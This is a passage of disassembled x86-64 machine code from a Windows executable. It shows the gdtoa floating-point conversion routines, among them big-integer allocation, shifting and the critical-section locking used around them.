   140007d9e:	4c 8b 4c 24 48       	mov    0x48(%rsp),%r9
   140007da3:	48 89 c5             	mov    %rax,%rbp
   140007da6:	0f 85 d4 fe ff ff    	jne    140007c80 <__gdtoa+0x1730>
   140007dac:	44 8b 5c 24 38       	mov    0x38(%rsp),%r11d
   140007db1:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140007db5:	44 89 5c 24 54       	mov    %r11d,0x54(%rsp)
   140007dba:	89 44 24 48          	mov    %eax,0x48(%rsp)
   140007dbe:	e9 31 f4 ff ff       	jmp    1400071f4 <__gdtoa+0xca4>
   140007dc3:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140007dc7:	66 0f 2e c8          	ucomisd %xmm0,%xmm1
   140007dcb:	e9 4e ff ff ff       	jmp    140007d1e <__gdtoa+0x17ce>
   140007dd0:	8b 44 24 48          	mov    0x48(%rsp),%eax
   140007dd4:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   140007dd8:	8d 50 ff             	lea    -0x1(%rax),%edx
   140007ddb:	39 d1                	cmp    %edx,%ecx
   140007ddd:	0f 8c c0 f9 ff ff    	jl     1400077a3 <__gdtoa+0x1253>
   140007de3:	29 d1                	sub    %edx,%ecx
   140007de5:	01 44 24 54          	add    %eax,0x54(%rsp)
   140007de9:	41 89 cc             	mov    %ecx,%r12d
   140007dec:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   140007df0:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%rsp)
   140007df7:	01 c8                	add    %ecx,%eax
   140007df9:	89 8c 24 80 00 00 00 	mov    %ecx,0x80(%rsp)
   140007e00:	89 44 24 60          	mov    %eax,0x60(%rsp)
   140007e04:	e9 ec ef ff ff       	jmp    140006df5 <__gdtoa+0x8a5>
   140007e09:	8b 4e 18             	mov    0x18(%rsi),%ecx
   140007e0c:	85 c9                	test   %ecx,%ecx
   140007e0e:	0f 85 b2 fb ff ff    	jne    1400079c6 <__gdtoa+0x1476>
   140007e14:	85 d2                	test   %edx,%edx
   140007e16:	0f 8f ba fd ff ff    	jg     140007bd6 <__gdtoa+0x1686>
   140007e1c:	48 89 ef             	mov    %rbp,%rdi
   140007e1f:	4d 8d 62 01          	lea    0x1(%r10),%r12
   140007e23:	4c 89 ed             	mov    %r13,%rbp
   140007e26:	e9 51 fc ff ff       	jmp    140007a7c <__gdtoa+0x152c>
   140007e2b:	8b 46 18             	mov    0x18(%rsi),%eax
   140007e2e:	48 89 ef             	mov    %rbp,%rdi
   140007e31:	4c 89 ed             	mov    %r13,%rbp
   140007e34:	85 c0                	test   %eax,%eax
   140007e36:	74 67                	je     140007e9f <__gdtoa+0x194f>
   140007e38:	c7 44 24 50 10 00 00 	movl   $0x10,0x50(%rsp)
   140007e3f:	00 
   140007e40:	4d 8d 62 01          	lea    0x1(%r10),%r12
   140007e44:	e9 33 fc ff ff       	jmp    140007a7c <__gdtoa+0x152c>
   140007e49:	89 c8                	mov    %ecx,%eax
   140007e4b:	01 4c 24 54          	add    %ecx,0x54(%rsp)
   140007e4f:	89 8c 24 9c 00 00 00 	mov    %ecx,0x9c(%rsp)
   140007e56:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   140007e5a:	01 c8                	add    %ecx,%eax
   140007e5c:	89 8c 24 80 00 00 00 	mov    %ecx,0x80(%rsp)
   140007e63:	89 44 24 60          	mov    %eax,0x60(%rsp)
   140007e67:	e9 89 ef ff ff       	jmp    140006df5 <__gdtoa+0x8a5>
   140007e6c:	75 0a                	jne    140007e78 <__gdtoa+0x1928>
   140007e6e:	41 f6 c0 01          	test   $0x1,%r8b
   140007e72:	0f 85 a1 fd ff ff    	jne    140007c19 <__gdtoa+0x16c9>
   140007e78:	c7 44 24 64 20 00 00 	movl   $0x20,0x64(%rsp)
   140007e7f:	00 
   140007e80:	e9 aa fd ff ff       	jmp    140007c2f <__gdtoa+0x16df>
   140007e85:	48 89 ef             	mov    %rbp,%rdi
   140007e88:	4d 8d 62 01          	lea    0x1(%r10),%r12
   140007e8c:	4c 89 ed             	mov    %r13,%rbp
   140007e8f:	e9 de fe ff ff       	jmp    140007d72 <__gdtoa+0x1822>
   140007e94:	8b 7c 24 40          	mov    0x40(%rsp),%edi
   140007e98:	f7 d7                	not    %edi
   140007e9a:	e9 8c f8 ff ff       	jmp    14000772b <__gdtoa+0x11db>
   140007e9f:	8b 44 24 64          	mov    0x64(%rsp),%eax
   140007ea3:	4d 8d 62 01          	lea    0x1(%r10),%r12
   140007ea7:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140007eab:	e9 cc fb ff ff       	jmp    140007a7c <__gdtoa+0x152c>
   140007eb0:	83 7e 14 01          	cmpl   $0x1,0x14(%rsi)
   140007eb4:	c7 44 24 50 10 00 00 	movl   $0x10,0x50(%rsp)
   140007ebb:	00 
   140007ebc:	0f 8f ea f4 ff ff    	jg     1400073ac <__gdtoa+0xe5c>
   140007ec2:	31 c0                	xor    %eax,%eax
   140007ec4:	83 7e 18 00          	cmpl   $0x0,0x18(%rsi)
   140007ec8:	0f 95 c0             	setne  %al
   140007ecb:	c1 e0 04             	shl    $0x4,%eax
   140007ece:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140007ed2:	e9 d5 f4 ff ff       	jmp    1400073ac <__gdtoa+0xe5c>
   140007ed7:	90                   	nop
   140007ed8:	90                   	nop
   140007ed9:	90                   	nop
   140007eda:	90                   	nop
   140007edb:	90                   	nop
   140007edc:	90                   	nop
   140007edd:	90                   	nop
   140007ede:	90                   	nop
   140007edf:	90                   	nop

0000000140007ee0 <__rshift_D2A>:
   140007ee0:	41 54                	push   %r12
   140007ee2:	55                   	push   %rbp
   140007ee3:	57                   	push   %rdi
   140007ee4:	56                   	push   %rsi
   140007ee5:	53                   	push   %rbx
   140007ee6:	48 63 59 14          	movslq 0x14(%rcx),%rbx
   140007eea:	89 d5                	mov    %edx,%ebp
   140007eec:	49 89 ca             	mov    %rcx,%r10
   140007eef:	c1 fd 05             	sar    $0x5,%ebp
   140007ef2:	39 eb                	cmp    %ebp,%ebx
   140007ef4:	7f 1a                	jg     140007f10 <__rshift_D2A+0x30>
   140007ef6:	41 c7 42 14 00 00 00 	movl   $0x0,0x14(%r10)
   140007efd:	00 
   140007efe:	41 c7 42 18 00 00 00 	movl   $0x0,0x18(%r10)
   140007f05:	00 
   140007f06:	5b                   	pop    %rbx
   140007f07:	5e                   	pop    %rsi
   140007f08:	5f                   	pop    %rdi
   140007f09:	5d                   	pop    %rbp
   140007f0a:	41 5c                	pop    %r12
   140007f0c:	c3                   	ret
   140007f0d:	0f 1f 00             	nopl   (%rax)
   140007f10:	4c 8d 61 18          	lea    0x18(%rcx),%r12
   140007f14:	48 63 ed             	movslq %ebp,%rbp
   140007f17:	4d 8d 1c 9c          	lea    (%r12,%rbx,4),%r11
   140007f1b:	49 8d 34 ac          	lea    (%r12,%rbp,4),%rsi
   140007f1f:	83 e2 1f             	and    $0x1f,%edx
   140007f22:	74 64                	je     140007f88 <__rshift_D2A+0xa8>
   140007f24:	44 8b 0e             	mov    (%rsi),%r9d
   140007f27:	bf 20 00 00 00       	mov    $0x20,%edi
   140007f2c:	89 d1                	mov    %edx,%ecx
   140007f2e:	4c 8d 46 04          	lea    0x4(%rsi),%r8
   140007f32:	29 d7                	sub    %edx,%edi
   140007f34:	41 d3 e9             	shr    %cl,%r9d
   140007f37:	4d 39 d8             	cmp    %r11,%r8
   140007f3a:	0f 83 80 00 00 00    	jae    140007fc0 <__rshift_D2A+0xe0>
   140007f40:	4c 89 e6             	mov    %r12,%rsi
   140007f43:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007f48:	41 8b 00             	mov    (%r8),%eax
   140007f4b:	89 f9                	mov    %edi,%ecx
   140007f4d:	48 83 c6 04          	add    $0x4,%rsi
   140007f51:	49 83 c0 04          	add    $0x4,%r8
   140007f55:	d3 e0                	shl    %cl,%eax
   140007f57:	89 d1                	mov    %edx,%ecx
   140007f59:	44 09 c8             	or     %r9d,%eax
   140007f5c:	89 46 fc             	mov    %eax,-0x4(%rsi)
   140007f5f:	45 8b 48 fc          	mov    -0x4(%r8),%r9d
   140007f63:	41 d3 e9             	shr    %cl,%r9d
   140007f66:	4d 39 d8             	cmp    %r11,%r8
   140007f69:	72 dd                	jb     140007f48 <__rshift_D2A+0x68>
   140007f6b:	48 29 eb             	sub    %rbp,%rbx
   140007f6e:	49 8d 44 9c fc       	lea    -0x4(%r12,%rbx,4),%rax
   140007f73:	44 89 08             	mov    %r9d,(%rax)
   140007f76:	45 85 c9             	test   %r9d,%r9d
   140007f79:	74 2a                	je     140007fa5 <__rshift_D2A+0xc5>
   140007f7b:	48 83 c0 04          	add    $0x4,%rax
   140007f7f:	eb 24                	jmp    140007fa5 <__rshift_D2A+0xc5>
   140007f81:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140007f88:	4c 89 e7             	mov    %r12,%rdi
   140007f8b:	4c 39 de             	cmp    %r11,%rsi
   140007f8e:	0f 83 62 ff ff ff    	jae    140007ef6 <__rshift_D2A+0x16>
   140007f94:	0f 1f 40 00          	nopl   0x0(%rax)
   140007f98:	a5                   	movsl  %ds:(%rsi),%es:(%rdi)
   140007f99:	4c 39 de             	cmp    %r11,%rsi
   140007f9c:	72 fa                	jb     140007f98 <__rshift_D2A+0xb8>
   140007f9e:	48 29 eb             	sub    %rbp,%rbx
   140007fa1:	49 8d 04 9c          	lea    (%r12,%rbx,4),%rax
   140007fa5:	4c 29 e0             	sub    %r12,%rax
   140007fa8:	48 c1 f8 02          	sar    $0x2,%rax
   140007fac:	41 89 42 14          	mov    %eax,0x14(%r10)
   140007fb0:	85 c0                	test   %eax,%eax
   140007fb2:	0f 84 46 ff ff ff    	je     140007efe <__rshift_D2A+0x1e>
   140007fb8:	5b                   	pop    %rbx
   140007fb9:	5e                   	pop    %rsi
   140007fba:	5f                   	pop    %rdi
   140007fbb:	5d                   	pop    %rbp
   140007fbc:	41 5c                	pop    %r12
   140007fbe:	c3                   	ret
   140007fbf:	90                   	nop
   140007fc0:	45 89 4a 18          	mov    %r9d,0x18(%r10)
   140007fc4:	45 85 c9             	test   %r9d,%r9d
   140007fc7:	0f 84 29 ff ff ff    	je     140007ef6 <__rshift_D2A+0x16>
   140007fcd:	4c 89 e0             	mov    %r12,%rax
   140007fd0:	eb a9                	jmp    140007f7b <__rshift_D2A+0x9b>
   140007fd2:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140007fd9:	00 00 00 00 
   140007fdd:	0f 1f 00             	nopl   (%rax)

0000000140007fe0 <__trailz_D2A>:
   140007fe0:	48 63 51 14          	movslq 0x14(%rcx),%rdx
   140007fe4:	48 8d 41 18          	lea    0x18(%rcx),%rax
   140007fe8:	48 8d 0c 90          	lea    (%rax,%rdx,4),%rcx
   140007fec:	31 d2                	xor    %edx,%edx
   140007fee:	48 39 c8             	cmp    %rcx,%rax
   140007ff1:	72 11                	jb     140008004 <__trailz_D2A+0x24>
   140007ff3:	eb 22                	jmp    140008017 <__trailz_D2A+0x37>
   140007ff5:	0f 1f 00             	nopl   (%rax)
   140007ff8:	48 83 c0 04          	add    $0x4,%rax
   140007ffc:	83 c2 20             	add    $0x20,%edx
   140007fff:	48 39 c8             	cmp    %rcx,%rax
   140008002:	73 13                	jae    140008017 <__trailz_D2A+0x37>
   140008004:	44 8b 00             	mov    (%rax),%r8d
   140008007:	45 85 c0             	test   %r8d,%r8d
   14000800a:	74 ec                	je     140007ff8 <__trailz_D2A+0x18>
   14000800c:	48 39 c8             	cmp    %rcx,%rax
   14000800f:	73 06                	jae    140008017 <__trailz_D2A+0x37>
   140008011:	f3 0f bc 00          	tzcnt  (%rax),%eax
   140008015:	01 c2                	add    %eax,%edx
   140008017:	89 d0                	mov    %edx,%eax
   140008019:	c3                   	ret
   14000801a:	90                   	nop
   14000801b:	90                   	nop
   14000801c:	90                   	nop
   14000801d:	90                   	nop
   14000801e:	90                   	nop
   14000801f:	90                   	nop

0000000140008020 <dtoa_lock>:
   140008020:	57                   	push   %rdi
   140008021:	56                   	push   %rsi
   140008022:	53                   	push   %rbx
   140008023:	48 83 ec 20          	sub    $0x20,%rsp
   140008027:	8b 05 c3 7a 00 00    	mov    0x7ac3(%rip),%eax        # 14000faf0 <dtoa_CS_init>
   14000802d:	89 ce                	mov    %ecx,%esi
   14000802f:	83 f8 02             	cmp    $0x2,%eax
   140008032:	0f 84 b8 00 00 00    	je     1400080f0 <dtoa_lock+0xd0>
   140008038:	85 c0                	test   %eax,%eax
   14000803a:	74 3c                	je     140008078 <dtoa_lock+0x58>
   14000803c:	83 f8 01             	cmp    $0x1,%eax
   14000803f:	75 2a                	jne    14000806b <dtoa_lock+0x4b>
   140008041:	48 8b 1d 10 83 00 00 	mov    0x8310(%rip),%rbx        # 140010358 <__imp_Sleep>
   140008048:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000804f:	00 
   140008050:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008055:	ff d3                	call   *%rbx
   140008057:	8b 05 93 7a 00 00    	mov    0x7a93(%rip),%eax        # 14000faf0 <dtoa_CS_init>
   14000805d:	83 f8 01             	cmp    $0x1,%eax
   140008060:	74 ee                	je     140008050 <dtoa_lock+0x30>
   140008062:	83 f8 02             	cmp    $0x2,%eax
   140008065:	0f 84 85 00 00 00    	je     1400080f0 <dtoa_lock+0xd0>
   14000806b:	48 83 c4 20          	add    $0x20,%rsp
   14000806f:	5b                   	pop    %rbx
   140008070:	5e                   	pop    %rsi
   140008071:	5f                   	pop    %rdi
   140008072:	c3                   	ret
   140008073:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008078:	b8 01 00 00 00       	mov    $0x1,%eax
   14000807d:	87 05 6d 7a 00 00    	xchg   %eax,0x7a6d(%rip)        # 14000faf0 <dtoa_CS_init>
   140008083:	85 c0                	test   %eax,%eax
   140008085:	75 49                	jne    1400080d0 <dtoa_lock+0xb0>
   140008087:	48 8d 1d 72 7a 00 00 	lea    0x7a72(%rip),%rbx        # 14000fb00 <dtoa_CritSec>
   14000808e:	48 8b 3d 8b 82 00 00 	mov    0x828b(%rip),%rdi        # 140010320 <__imp_InitializeCriticalSection>
   140008095:	48 89 d9             	mov    %rbx,%rcx
   140008098:	ff d7                	call   *%rdi
   14000809a:	48 8d 4b 28          	lea    0x28(%rbx),%rcx
   14000809e:	ff d7                	call   *%rdi
   1400080a0:	48 8d 0d 59 00 00 00 	lea    0x59(%rip),%rcx        # 140008100 <dtoa_lock_cleanup>
   1400080a7:	e8 64 93 ff ff       	call   140001410 <atexit>
   1400080ac:	c7 05 3a 7a 00 00 02 	movl   $0x2,0x7a3a(%rip)        # 14000faf0 <dtoa_CS_init>
   1400080b3:	00 00 00 
   1400080b6:	48 89 f1             	mov    %rsi,%rcx
   1400080b9:	48 f7 d9             	neg    %rcx
   1400080bc:	83 e1 28             	and    $0x28,%ecx
   1400080bf:	48 01 d9             	add    %rbx,%rcx
   1400080c2:	48 83 c4 20          	add    $0x20,%rsp
   1400080c6:	5b                   	pop    %rbx
   1400080c7:	5e                   	pop    %rsi
   1400080c8:	5f                   	pop    %rdi
   1400080c9:	48 ff 25 30 82 00 00 	rex.W jmp *0x8230(%rip)        # 140010300 <__imp_EnterCriticalSection>
   1400080d0:	48 8d 1d 29 7a 00 00 	lea    0x7a29(%rip),%rbx        # 14000fb00 <dtoa_CritSec>
   1400080d7:	83 f8 02             	cmp    $0x2,%eax
   1400080da:	74 d0                	je     1400080ac <dtoa_lock+0x8c>
   1400080dc:	8b 05 0e 7a 00 00    	mov    0x7a0e(%rip),%eax        # 14000faf0 <dtoa_CS_init>
   1400080e2:	83 f8 01             	cmp    $0x1,%eax
   1400080e5:	0f 84 56 ff ff ff    	je     140008041 <dtoa_lock+0x21>
   1400080eb:	e9 72 ff ff ff       	jmp    140008062 <dtoa_lock+0x42>
   1400080f0:	48 8d 1d 09 7a 00 00 	lea    0x7a09(%rip),%rbx        # 14000fb00 <dtoa_CritSec>
   1400080f7:	eb bd                	jmp    1400080b6 <dtoa_lock+0x96>
   1400080f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000140008100 <dtoa_lock_cleanup>:
   140008100:	53                   	push   %rbx
   140008101:	48 83 ec 20          	sub    $0x20,%rsp
   140008105:	b8 03 00 00 00       	mov    $0x3,%eax
   14000810a:	87 05 e0 79 00 00    	xchg   %eax,0x79e0(%rip)        # 14000faf0 <dtoa_CS_init>
   140008110:	83 f8 02             	cmp    $0x2,%eax
   140008113:	74 0b                	je     140008120 <dtoa_lock_cleanup+0x20>
   140008115:	48 83 c4 20          	add    $0x20,%rsp
   140008119:	5b                   	pop    %rbx
   14000811a:	c3                   	ret
   14000811b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008120:	48 8b 1d d1 81 00 00 	mov    0x81d1(%rip),%rbx        # 1400102f8 <__imp_DeleteCriticalSection>
   140008127:	48 8d 0d d2 79 00 00 	lea    0x79d2(%rip),%rcx        # 14000fb00 <dtoa_CritSec>
   14000812e:	ff d3                	call   *%rbx
   140008130:	48 8d 0d f1 79 00 00 	lea    0x79f1(%rip),%rcx        # 14000fb28 <dtoa_CritSec+0x28>
   140008137:	48 89 d8             	mov    %rbx,%rax
   14000813a:	48 83 c4 20          	add    $0x20,%rsp
   14000813e:	5b                   	pop    %rbx
   14000813f:	48 ff e0             	rex.W jmp *%rax
   140008142:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140008149:	00 00 00 00 
   14000814d:	0f 1f 00             	nopl   (%rax)

0000000140008150 <__Balloc_D2A>:
   140008150:	56                   	push   %rsi
   140008151:	53                   	push   %rbx
   140008152:	48 83 ec 38          	sub    $0x38,%rsp
   140008156:	89 cb                	mov    %ecx,%ebx
   140008158:	31 c9                	xor    %ecx,%ecx
   14000815a:	e8 c1 fe ff ff       	call   140008020 <dtoa_lock>
   14000815f:	83 fb 09             	cmp    $0x9,%ebx
   140008162:	7f 3c                	jg     1400081a0 <__Balloc_D2A+0x50>
   140008164:	48 8d 15 35 79 00 00 	lea    0x7935(%rip),%rdx        # 14000faa0 <freelist>
   14000816b:	48 63 cb             	movslq %ebx,%rcx
   14000816e:	48 8b 04 ca          	mov    (%rdx,%rcx,8),%rax
   140008172:	48 85 c0             	test   %rax,%rax
   140008175:	74 79                	je     1400081f0 <__Balloc_D2A+0xa0>
   140008177:	4c 8b 00             	mov    (%rax),%r8
   14000817a:	83 3d 6f 79 00 00 02 	cmpl   $0x2,0x796f(%rip)        # 14000faf0 <dtoa_CS_init>
   140008181:	4c 89 04 ca          	mov    %r8,(%rdx,%rcx,8)
   140008185:	75 52                	jne    1400081d9 <__Balloc_D2A+0x89>
   140008187:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000818c:	48 8d 0d 6d 79 00 00 	lea    0x796d(%rip),%rcx        # 14000fb00 <dtoa_CritSec>
   140008193:	ff 15 97 81 00 00    	call   *0x8197(%rip)        # 140010330 <__imp_LeaveCriticalSection>
   140008199:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000819e:	eb 39                	jmp    1400081d9 <__Balloc_D2A+0x89>
   1400081a0:	89 d9                	mov    %ebx,%ecx
   1400081a2:	be 01 00 00 00       	mov    $0x1,%esi
   1400081a7:	d3 e6                	shl    %cl,%esi
   1400081a9:	8d 46 ff             	lea    -0x1(%rsi),%eax
   1400081ac:	48 98                	cltq
   1400081ae:	48 8d 0c 85 27 00 00 	lea    0x27(,%rax,4),%rcx
   1400081b5:	00 
   1400081b6:	48 c1 e9 03          	shr    $0x3,%rcx
   1400081ba:	89 c9                	mov    %ecx,%ecx
   1400081bc:	48 c1 e1 03          	shl    $0x3,%rcx
   1400081c0:	e8 0b 12 00 00       	call   1400093d0 <malloc>
   1400081c5:	48 85 c0             	test   %rax,%rax
   1400081c8:	74 17                	je     1400081e1 <__Balloc_D2A+0x91>
   1400081ca:	83 3d 1f 79 00 00 02 	cmpl   $0x2,0x791f(%rip)        # 14000faf0 <dtoa_CS_init>
   1400081d1:	89 58 08             	mov    %ebx,0x8(%rax)
   1400081d4:	89 70 0c             	mov    %esi,0xc(%rax)
   1400081d7:	74 ae                	je     140008187 <__Balloc_D2A+0x37>
   1400081d9:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
   1400081e0:	00 
   1400081e1:	48 83 c4 38          	add    $0x38,%rsp
   1400081e5:	5b                   	pop    %rbx
   1400081e6:	5e                   	pop    %rsi
   1400081e7:	c3                   	ret
   1400081e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400081ef:	00 
   1400081f0:	89 d9                	mov    %ebx,%ecx
   1400081f2:	be 01 00 00 00       	mov    $0x1,%esi
   1400081f7:	4c 8d 05 a2 6f 00 00 	lea    0x6fa2(%rip),%r8        # 14000f1a0 <private_mem>
   1400081fe:	d3 e6                	shl    %cl,%esi
   140008200:	8d 46 ff             	lea    -0x1(%rsi),%eax
   140008203:	48 98                	cltq
   140008205:	48 8d 0c 85 27 00 00 	lea    0x27(,%rax,4),%rcx
   14000820c:	00 
   14000820d:	48 8b 05 5c 1e 00 00 	mov    0x1e5c(%rip),%rax        # 14000a070 <pmem_next>
   140008214:	48 c1 e9 03          	shr    $0x3,%rcx
   140008218:	48 89 c2             	mov    %rax,%rdx
   14000821b:	4c 29 c2             	sub    %r8,%rdx
   14000821e:	48 c1 fa 03          	sar    $0x3,%rdx
   140008222:	48 01 ca             	add    %rcx,%rdx
   140008225:	48 81 fa 20 01 00 00 	cmp    $0x120,%rdx
   14000822c:	77 8e                	ja     1400081bc <__Balloc_D2A+0x6c>
   14000822e:	48 8d 14 c8          	lea    (%rax,%rcx,8),%rdx
   140008232:	48 89 15 37 1e 00 00 	mov    %rdx,0x1e37(%rip)        # 14000a070 <pmem_next>
   140008239:	eb 8f                	jmp    1400081ca <__Balloc_D2A+0x7a>
   14000823b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000140008240 <__Bfree_D2A>:
   140008240:	53                   	push   %rbx
   140008241:	48 83 ec 20          	sub    $0x20,%rsp
   140008245:	48 89 cb             	mov    %rcx,%rbx
   140008248:	48 85 c9             	test   %rcx,%rcx
   14000824b:	74 39                	je     140008286 <__Bfree_D2A+0x46>
   14000824d:	83 79 08 09          	cmpl   $0x9,0x8(%rcx)
   140008251:	7e 0d                	jle    140008260 <__Bfree_D2A+0x20>
   140008253:	48 83 c4 20          	add    $0x20,%rsp
   140008257:	5b                   	pop    %rbx
   140008258:	e9 5b 11 00 00       	jmp    1400093b8 <free>
   14000825d:	0f 1f 00             	nopl   (%rax)
   140008260:	31 c9                	xor    %ecx,%ecx
   140008262:	e8 b9 fd ff ff       	call   140008020 <dtoa_lock>
   140008267:	48 63 53 08          	movslq 0x8(%rbx),%rdx
   14000826b:	48 8d 05 2e 78 00 00 	lea    0x782e(%rip),%rax        # 14000faa0 <freelist>
   140008272:	83 3d 77 78 00 00 02 	cmpl   $0x2,0x7877(%rip)        # 14000faf0 <dtoa_CS_init>
   140008279:	48 8b 0c d0          	mov    (%rax,%rdx,8),%rcx
   14000827d:	48 89 1c d0          	mov    %rbx,(%rax,%rdx,8)
   140008281:	48 89 0b             	mov    %rcx,(%rbx)
   140008284:	74 0a                	je     140008290 <__Bfree_D2A+0x50>
   140008286:	48 83 c4 20          	add    $0x20,%rsp
   14000828a:	5b                   	pop    %rbx
   14000828b:	c3                   	ret
   14000828c:	0f 1f 40 00          	nopl   0x0(%rax)
   140008290:	48 8d 0d 69 78 00 00 	lea    0x7869(%rip),%rcx        # 14000fb00 <dtoa_CritSec>
   140008297:	48 83 c4 20          	add    $0x20,%rsp
   14000829b:	5b                   	pop    %rbx
   14000829c:	48 ff 25 8d 80 00 00 	rex.W jmp *0x808d(%rip)        # 140010330 <__imp_LeaveCriticalSection>
   1400082a3:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400082aa:	00 00 00 00 
   1400082ae:	66 90                	xchg   %ax,%ax

00000001400082b0 <__multadd_D2A>:
   1400082b0:	55                   	push   %rbp
   1400082b1:	57                   	push   %rdi
   1400082b2:	56                   	push   %rsi
   1400082b3:	53                   	push   %rbx
   1400082b4:	48 83 ec 28          	sub    $0x28,%rsp
   1400082b8:	8b 79 14             	mov    0x14(%rcx),%edi
   1400082bb:	48 89 cb             	mov    %rcx,%rbx
   1400082be:	49 63 f0             	movslq %r8d,%rsi
   1400082c1:	48 63 d2             	movslq %edx,%rdx
   1400082c4:	31 c9                	xor    %ecx,%ecx
   1400082c6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400082cd:	00 00 00 
   1400082d0:	8b 44 8b 18          	mov    0x18(%rbx,%rcx,4),%eax
   1400082d4:	48 0f af c2          	imul   %rdx,%rax
   1400082d8:	48 01 f0             	add    %rsi,%rax
   1400082db:	89 44 8b 18          	mov    %eax,0x18(%rbx,%rcx,4)
   1400082df:	48 89 c6             	mov    %rax,%rsi
   1400082e2:	48 83 c1 01          	add    $0x1,%rcx
   1400082e6:	48 c1 ee 20          	shr    $0x20,%rsi
   1400082ea:	39 cf                	cmp    %ecx,%edi
   1400082ec:	7f e2                	jg     1400082d0 <__multadd_D2A+0x20>
   1400082ee:	48 89 dd             	mov    %rbx,%rbp
   1400082f1:	48 85 f6             	test   %rsi,%rsi
   1400082f4:	74 15                	je     14000830b <__multadd_D2A+0x5b>
   1400082f6:	39 7b 0c             	cmp    %edi,0xc(%rbx)
   1400082f9:	7e 25                	jle    140008320 <__multadd_D2A+0x70>
   1400082fb:	48 63 c7             	movslq %edi,%rax
   1400082fe:	83 c7 01             	add    $0x1,%edi
   140008301:	48 89 dd             	mov    %rbx,%rbp
   140008304:	89 74 83 18          	mov    %esi,0x18(%rbx,%rax,4)
   140008308:	89 7b 14             	mov    %edi,0x14(%rbx)
   14000830b:	48 89 e8             	mov    %rbp,%rax
   14000830e:	48 83 c4 28          	add    $0x28,%rsp
   140008312:	5b                   	pop    %rbx
   140008313:	5e                   	pop    %rsi
   140008314:	5f                   	pop    %rdi
   140008315:	5d                   	pop    %rbp
   140008316:	c3                   	ret
   140008317:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000831e:	00 00 
   140008320:	8b 43 08             	mov    0x8(%rbx),%eax
   140008323:	8d 48 01             	lea    0x1(%rax),%ecx
   140008326:	e8 25 fe ff ff       	call   140008150 <__Balloc_D2A>
   14000832b:	48 89 c5             	mov    %rax,%rbp
   14000832e:	48 85 c0             	test   %rax,%rax
   140008331:	74 d8                	je     14000830b <__multadd_D2A+0x5b>
   140008333:	48 8d 48 10          	lea    0x10(%rax),%rcx
   140008337:	48 63 43 14          	movslq 0x14(%rbx),%rax
   14000833b:	48 8d 53 10          	lea    0x10(%rbx),%rdx
   14000833f:	4c 8d 04 85 08 00 00 	lea    0x8(,%rax,4),%r8
   140008346:	00 
   140008347:	e8 8c 10 00 00       	call   1400093d8 <memcpy>
   14000834c:	48 89 d9             	mov    %rbx,%rcx
   14000834f:	48 89 eb             	mov    %rbp,%rbx
   140008352:	e8 e9 fe ff ff       	call   140008240 <__Bfree_D2A>
   140008357:	48 63 c7             	movslq %edi,%rax
   14000835a:	83 c7 01             	add    $0x1,%edi
   14000835d:	48 89 dd             	mov    %rbx,%rbp
   140008360:	89 74 83 18          	mov    %esi,0x18(%rbx,%rax,4)
   140008364:	89 7b 14             	mov    %edi,0x14(%rbx)
   140008367:	eb a2                	jmp    14000830b <__multadd_D2A+0x5b>
   140008369:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000140008370 <__i2b_D2A>:
   140008370:	53                   	push   %rbx
   140008371:	48 83 ec 30          	sub    $0x30,%rsp
   140008375:	89 cb                	mov    %ecx,%ebx
   140008377:	31 c9                	xor    %ecx,%ecx
   140008379:	e8 a2 fc ff ff       	call   140008020 <dtoa_lock>
   14000837e:	48 8b 05 23 77 00 00 	mov    0x7723(%rip),%rax        # 14000faa8 <freelist+0x8>
   140008385:	48 85 c0             	test   %rax,%rax
   140008388:	74 2e                	je     1400083b8 <__i2b_D2A+0x48>
   14000838a:	48 8b 10             	mov    (%rax),%rdx
   14000838d:	83 3d 5c 77 00 00 02 	cmpl   $0x2,0x775c(%rip)        # 14000faf0 <dtoa_CS_init>
   140008394:	48 89 15 0d 77 00 00 	mov    %rdx,0x770d(%rip)        # 14000faa8 <freelist+0x8>
   14000839b:	74 63                	je     140008400 <__i2b_D2A+0x90>
   14000839d:	48 8b 15 8c 35 00 00 	mov    0x358c(%rip),%rdx        # 14000b930 <__bigtens_D2A+0x30>
   1400083a4:	89 58 18             	mov    %ebx,0x18(%rax)
   1400083a7:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1400083ab:	48 83 c4 30          	add    $0x30,%rsp
   1400083af:	5b                   	pop    %rbx
   1400083b0:	c3                   	ret
   1400083b1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400083b8:	48 8b 05 b1 1c 00 00 	mov    0x1cb1(%rip),%rax        # 14000a070 <pmem_next>
   1400083bf:	48 8d 0d da 6d 00 00 	lea    0x6dda(%rip),%rcx        # 14000f1a0 <private_mem>
   1400083c6:	48 89 c2             	mov    %rax,%rdx
   1400083c9:	48 29 ca             	sub    %rcx,%rdx
   1400083cc:	48 c1 fa 03          	sar    $0x3,%rdx
   1400083d0:	48 83 c2 05          	add    $0x5,%rdx
   1400083d4:	48 81 fa 20 01 00 00 	cmp    $0x120,%rdx
